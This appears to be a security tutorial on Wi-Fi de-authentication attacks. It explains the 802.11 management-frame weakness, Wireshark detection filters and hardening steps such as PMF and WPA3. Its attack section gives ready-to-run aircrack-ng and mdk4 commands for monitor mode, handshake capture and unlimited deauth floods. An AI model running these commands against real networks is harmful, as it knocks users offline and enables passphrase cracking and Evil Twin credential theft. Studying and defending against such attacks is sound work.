# Wireless (Wi-Fi) Security — De-authentication Attacks

---

## Overview
**De-Authentication attack** — a Wi-Fi **management-frame** DoS where an attacker forges 802.11 **De-authentication** frames to force clients off a Wi-Fi network.  
Attackers primarily use it to:
- perform **Evil Twin** attacks (trick clients to join a fake AP), and  
- capture the **4-Way WPA/WPA2 handshake** for offline brute-force/dictionary cracking.

---

## Agenda (covered in this document)
1. What is a De-Authentication attack?  
2. Why hackers use De-Authentication attacks.  
3. Executing a De-Authentication attack (example commands).  
4. Detecting and analysing De-Authentication attacks with **Wireshark**.  
5. Optimizing Wireshark to detect De-Authentication attacks easily.  
6. Security tips — protect your Wi-Fi network from threats.

---

## 1. What is a De-Authentication attack?
A De-Authentication attack is a management-frame denial-of-service (DoS) technique where forged 802.11 De-authentication frames are sent to clients (or broadcast) causing them to disconnect from an AP. The attacker spoofs the AP’s MAC and sends these frames, exploiting the fact that original 802.11 management frames are unauthenticated by default.

---

## 2. Why attackers use De-Authentication
- **Evil Twin:** Force clients off a legitimate AP so they connect to a malicious clone (same SSID/MAC). The attacker can capture credentials or intercept traffic.  
- **Handshake capture:** Force re-authentication to capture the 4-Way handshake between client and AP. With a captured handshake, attackers can attempt offline brute-force or dictionary attacks to recover the passphrase.

---

## 3. How 802.11 is abused
802.11 uses frames for everything. There are three primary frame types:
- **Management frames** (e.g., association, authentication, deauth)  
- **Control frames**  
- **Data frames**

**De-authentication** is a management subtype. Because management frames were historically unprotected, attackers can forge them—spoofing the AP MAC—to disconnect clients at will. (802.11w/PMF addresses this but needs support on both AP and clients.)

---

## 4. Typical attacker workflow (Kali + aircrack-ng / mdk4 examples)

> **Warning:** Only perform these techniques on networks you own or have explicit authorization to test.

### Detect wireless adapter & networks
```bash
ifconfig wlan0
iwconfig
sudo iwlist wlan0 scan | grep ESSID
nmcli device wifi list
```

### Enable monitor mode
```bash
sudo airmon-ng check
sudo airmon-ng check kill            # stop NetworkManager / dhcpcd / wpa_supplicant if needed
sudo airmon-ng start wlan0
iwconfig wlan0                        # should show Monitor mode
```

### Targeted capture (save capture for handshake)
```bash
sudo airodump-ng --bssid 66:46:D1:88:97:39 -c 1 --write /home/kali/Desktop/handshake01 wlan0
```

### Launch Deauth (aireplay-ng)
```bash
sudo aireplay-ng --deauth 0 -a 66:46:D1:88:97:39 wlan0
# 0 = unlimited (Ctrl+C to stop)
# To target a specific client: 
sudo aireplay-ng --deauth 10 -a <AP-MAC> -c <CLIENT-MAC> wlan0
```

### Alternative/efficient attacker tool: mdk4
```bash
sudo apt-get install mdk4
sudo mdk4 wlan0 d -c 11    # d = deauth, -c = channel
```

### Clean up / restore adapter
```bash
sudo airmon-ng stop wlan0
sudo modprobe -r rtl8xxxu        # example driver; replace per your adapter
sudo modprobe rtl8xxxu
sudo systemctl restart NetworkManager
sudo ip link set wlan0 down
sudo ip link set wlan0 up
```

---

## 5. Detecting & analysing De-authentication attacks with Wireshark

### Capture setup
- Use the monitor mode interface (e.g., `wlan0` in monitor).
- Prefer targeted captures (specific channel/BSSID) to reduce noise.

### Useful Wireshark filters
- **Display filter (shows deauth frames):**
```
wlan.fc.type_subtype == 12
```
- **Capture filter (applied before capture; reduces load):**
```
wlan type mgt and subtype deauth
```

### What to look for in a packet
- Many frames with **Subtype = Deauthentication (0x000c)**.
- Repeated **Transmitter/Source address** matching the AP MAC (often spoofed).
- Repeated **Reason Code** values (common when automated tools run).
- Many clients receiving deauths, or repeated deauths to the same client.

### Signs of attack
- Large volume of deauth frames in a short time.
- Frequent unexplained disconnects across multiple clients.
- Discovery of an additional AP with exactly the same SSID (possible Evil Twin).

---

## 6. Optimizing Wireshark for easy detection

### Coloring rule (highlight deauths)
1. `View → Coloring Rules → +`
2. Condition: `wlan.fc.type_subtype == 12`
3. Choose a distinct background/foreground color.

### Use capture filters to reduce noise
- Apply: `wlan type mgt and subtype deauth` at capture start.

### Target BSSID & Channel
- Use `airodump-ng` or set Wireshark to capture only on the channel and BSSID of interest.

### Correlate with external logs
- Cross-check `airodump-ng` / `mdk4` output with Wireshark captures for precise timestamps and target/client mapping.

---

## 7. Hardening & Security Tips (protect your Wi-Fi)
1. **Enable Protected Management Frames (PMF / 802.11w)** on AP and ensure clients support it. This prevents forged deauth/disassoc frames.  
2. **Use WPA3** where possible; prefer modern protocols over legacy WPA2.  
3. **Strong passphrases** — long, random passwords to defeat offline brute-force/dictionary attempts.  
4. **Change default admin user/password** on routers and keep firmware updated.  
5. **Use 802.1X (Enterprise)** for larger/critical environments (RADIUS authentication).  
6. **Disable WPS** if not required.  
7. **Educate users**: do not connect to suspicious or duplicate SSIDs; verify network before entering credentials.  
8. **Monitor** networks for repeated deauth activity; persistent floods likely indicate an attack.  
9. **Limit AP management access** (HTTPS/SSH, strong credentials, no remote admin unless necessary).  
10. **Scan for rogue APs** regularly; investigate duplicate SSIDs or MAC anomalies.

---

## Quick reference — commands & filters
- **Wireshark display:** `wlan.fc.type_subtype == 12`  
- **Wireshark capture filter:** `wlan type mgt and subtype deauth`  
- **Start monitor mode:** `sudo airmon-ng start wlan0`  
- **Targeted capture:** `sudo airodump-ng --bssid <BSSID> -c <CH> --write <file> wlan0`  
- **Deauth (aireplay-ng):** `sudo aireplay-ng --deauth <count> -a <AP-MAC> [-c <client-MAC>] wlan0`  
- **mdk4 deauth:** `sudo mdk4 wlan0 d -c <channel>`

---

## Final notes
- De-authentication is a known protocol weakness; **adoption of PMF (802.11w)** and modern Wi-Fi standards reduces risk.  
- For defenders: combine **real-time monitoring**, **capture filters**, **coloring rules**, and periodic scans to quickly spot and mitigate deauth floods.  
- For ethical testers: always obtain **explicit permission** before testing networks you do not own.

---
